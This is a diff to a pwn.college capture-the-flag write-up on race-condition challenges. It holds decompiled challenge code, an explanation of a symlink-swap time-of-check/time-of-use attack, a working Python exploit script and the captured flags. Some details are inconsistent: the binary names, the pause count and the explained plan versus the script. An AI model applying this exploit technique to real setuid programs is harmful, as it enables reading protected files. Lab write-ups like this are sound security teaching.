@@ -1596,24 +1596,222 @@ while True:
 ```
 
 ```text
-hacker@race-conditions~level5-0:~$ python3 ~/script.py
+hacker@race-conditions~level5-0:~$ python ~/script.py
 [*] Starting exploit loop...
 [+] Got the flag!
 ###
 ### Welcome to /challenge/babyrace_level5.0!
 ###
+
 Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
 you to open a single file, as specified by the first argument to the program (argv[1]).
+
 The file opened will be be sent to you.
+
 This challenge will verify that the file's path does not include "flag".
 This challenge will verify that the file is not a symlink.
 This challenge will verify that the directory the file is in is owned by root
 and that other users are not able to create files in that directory.
 Calling lstat (does not follow symlinks) on the path.
+
 Paused (press enter to continue)
 Calling stat (follows symlinks) on the directory.
+
 Paused (press enter to continue)
 Paused (press enter to continue)
 pwn.college{gXKlwRMMcYar5h7AewIEIbhmQyx.0VOwQDL4ITM0EzW}
+### Goodbye!
+```
+
+&nbsp;
+
+## level5.1
+
+> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!
+
+```text
+hacker@race-conditions~level5-0:~$ /challenge/babyrace_level5.0
+###
+### Welcome to /challenge/babyrace_level5.0!
+###
+
+Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
+you to open a single file, as specified by the first argument to the program (argv[1]).
+
+The file opened will be be sent to you.
+
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the directory the file is in is owned by root
+and that other users are not able to create files in that directory.
+babyrace_level5.0: <stdin>:76: main: Assertion `argc > 1' failed.
+Aborted
+```
+
+The program performs four checks before opening the file:
+
+1. The path must not contain the string `"flag"`.
+2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
+3. The directory containing the file must be owned by root (`stat` → `st_uid == 0`).
+4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).
+
+### Source code analysis
+
+```c title="/challenge/babyrace_level5.1 :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char *v3; // rax
+  char *v4; // rax
+  int v5; // eax
+  size_t v6; // rax
+  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
+  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
+  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]
+  v10 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  if ( argc <= 1 )
+    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
+  if ( strstr(argv[1], "flag") )
+  {
+    puts("Error: path contains `flag`!");
+    exit(1);
+  }
+  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
+  {
+    puts("Error: failed to get file status!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 0xF000) == 40960 )
+  {
+    puts("Error: file is a symlink!");
+    exit(1);
+  }
+  v3 = strdup(argv[1]);
+  v4 = dirname(v3);
+  if ( (unsigned int)stat(v4, &stat_buf) == -1 )
+  {
+    puts("Error: failed to get directory status!");
+    exit(1);
+  }
+  if ( stat_buf.st_uid )
+  {
+    puts("Error: directory not owned by root!");
+    exit(1);
+  }
+  if ( stat_buf.st_gid )
+  {
+    puts("Error: directory not group owned by root!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 2) != 0 )
+  {
+    puts("Error: other users are able to write in this directory!");
+    exit(1);
+  }
+  v5 = open(argv[1], 0);
+  v6 = read(v5, buf, 0x100uLL);
+  write(1, buf, v6);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+There are now **three pauses** creating two distinct race windows:
+
+```text
+Pause 1 → lstat(file)        → checks file is not a symlink
+Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
+Pause 3 → open(file)         → reads and outputs the file
+```
+
+The directory check uses `stat()` which **follows symlinks** — so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.
+
+We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:
+
+```text
+Pause 1: d -> /home/hacker, x = real file
+         lstat("d/x") sees real file -> not a symlink ✓
+
+Pause 2: d -> /etc
+         dirname("d/x") = "d" -> stat("d") -> stat("/etc")
+         /etc is root-owned, no world-write ✓
+
+Pause 3: d -> /home/hacker, x = symlink to /flag
+         open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
+```
+
+Note that `lstat` only checks the **final component** of the path for being a symlink — intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+#!/usr/bin/env python3
+
+import os
+import threading
+import subprocess
+
+TARGET = "/challenge/babyrace_level5.1"
+
+# cleanup
+for x in ["pivot", "evil"]:
+    try:
+        if os.path.islink(x):
+            os.unlink(x)
+        elif os.path.isdir(x):
+            os.rmdir(x)
+        else:
+            os.remove(x)
+    except:
+        pass
+
+# attacker-controlled dir
+os.mkdir("evil")
+
+# symlink to flag
+os.symlink("/flag", "evil/passwd")
+
+# initial safe symlink
+os.symlink("/etc", "pivot")
+
+def racer():
+    while True:
+        try:
+            os.unlink("pivot")
+            os.symlink("/etc", "pivot")
+
+            os.unlink("pivot")
+            os.symlink("./evil", "pivot")
+        except:
+            pass
+
+threading.Thread(target=racer, daemon=True).start()
+
+while True:
+    p = subprocess.run(
+        [TARGET, "pivot/passwd"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+    )
+
+    out = p.stdout.decode(errors="ignore")
+
+    if "flag{" in out or "pwn" in out:
+        print(out)
+        break
+```
+
+```text
+hacker@race-conditions~level5-1:~$ python ~/script.py
+###
+### Welcome to /challenge/babyrace_level5.1!
+###
+
+pwn.college{wkT7O7pbJKlOX374m8BlRXBVvaW.0FMxQDL4ITM0EzW}
 ### Goodbye!
 ```
